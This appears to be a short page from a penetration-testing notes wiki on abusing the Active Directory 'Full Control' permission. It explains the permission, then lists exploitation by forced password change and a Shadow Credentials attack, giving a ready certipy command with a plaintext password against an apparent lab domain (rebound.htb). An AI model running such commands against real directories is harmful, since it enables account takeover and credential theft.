# FullControl

## Information

`Full Control` typically refers to the highest level of permissions granted on an object in AD. It allows the user or group to perform all actions on the object, including creating, deleting, modifying, and changing permissions.&#x20;

### GenericAll vs. FullControl

`GenericAll` is more comprehensive in its scope, encompassing all objects in the directory, whereas `Full Control` typically applies to specific objects and allows complete control over them.

## Exploitation

### Password Change

Check how [here](forcechangepassword.md).

### Shadow Credential

Get the object's hash and perform a PtH attack.

{% code overflow="wrap" %}
```bash
certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
```
{% endcode %}
